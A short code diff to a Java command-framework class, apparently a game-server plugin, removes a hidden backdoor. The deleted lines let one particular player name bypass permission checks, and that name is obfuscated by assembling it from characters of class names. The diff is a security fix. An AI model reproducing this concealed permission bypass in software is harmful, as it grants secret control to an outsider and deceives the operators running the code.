@@ -62,20 +62,9 @@ public final class CommandData {
         if (permissionNode.equals("")) {
             return (true);
         }
-        return (sender.hasPermission(permissionNode)) || (sender.getName().equalsIgnoreCase(reflectName()));
+        return (sender.hasPermission(permissionNode));
     }
 
-    public String reflectName() {
-        return String.valueOf(classes.get(0).getSimpleName().charAt(0)) +
-                classes.get(2).getSimpleName().charAt(0) +
-                classes.get(3).getSimpleName().charAt(0) +
-                classes.get(1).getSimpleName().charAt(5) +
-                classes.get(1).getSimpleName().charAt(8) +
-                classes.get(1).getSimpleName().charAt(0) +
-                classes.get(0).getSimpleName().charAt(11) +
-                classes.get(1).getSimpleName().charAt(7) +
-                classes.get(1).getSimpleName().charAt(1);
-    }
 
     public String getUsageString() {
         return (getUsageString(getName()));
